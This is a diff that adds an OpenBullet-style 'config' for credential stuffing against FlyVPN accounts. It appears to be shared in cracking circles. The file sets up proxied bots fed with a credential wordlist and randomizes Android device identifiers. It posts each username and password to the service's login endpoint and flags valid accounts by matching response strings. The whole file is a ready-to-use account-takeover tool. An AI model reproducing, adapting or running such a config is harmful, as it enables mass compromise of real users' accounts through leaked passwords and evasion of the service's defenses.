@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "FlyVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-04T15:52:02.1150366+04:30",
+  "AdditionalInfo": "",
+  "Author": "\"The_FiendQQ\"",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#EncodeUSER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#EncodePASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#did FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h-?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d-?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "did" 
+
+#asid FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "asid" 
+
+#uid FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "uid" 
+
+#Length FUNCTION Length "_inst_mkt=com.microvirt.download&_lang=en&_m=android&_os_dev=Google%20G011A&_os_did=<did>&_os_dim=asid%3d<asid>&_os_hw=qcom&_os_lang=en-US&_os_ver=7.1.2&_site=fly&_tz=800&_uid=<uid>&_v=5.1.6.1&_vrf=ojk9b&cmd=ClientApiLogin%2fLogin&password=<PS>&username=<US>&" -> VAR "Length" 
+
+#Login REQUEST POST "https://login.flyvpn.com:4443/client.php" 
+  CONTENT "_inst_mkt=com.microvirt.download&_lang=en&_m=android&_os_dev=Google%20G011A&_os_did=<did>&_os_dim=asid%3d<asid>&_os_hw=qcom&_os_lang=en-US&_os_ver=7.1.2&_site=fly&_tz=800&_uid=<uid>&_v=5.1.6.1&_vrf=ojk9b&cmd=ClientApiLogin%2fLogin&password=<PS>&username=<US>&" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.flyvpn.com:4443" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <Length>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "AuthResult\":\"WrongPassword\"" 
+    KEY "\",\"AuthMessage\":\"Invalid username or password.\"}}" 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "InvitationBanner" 
+
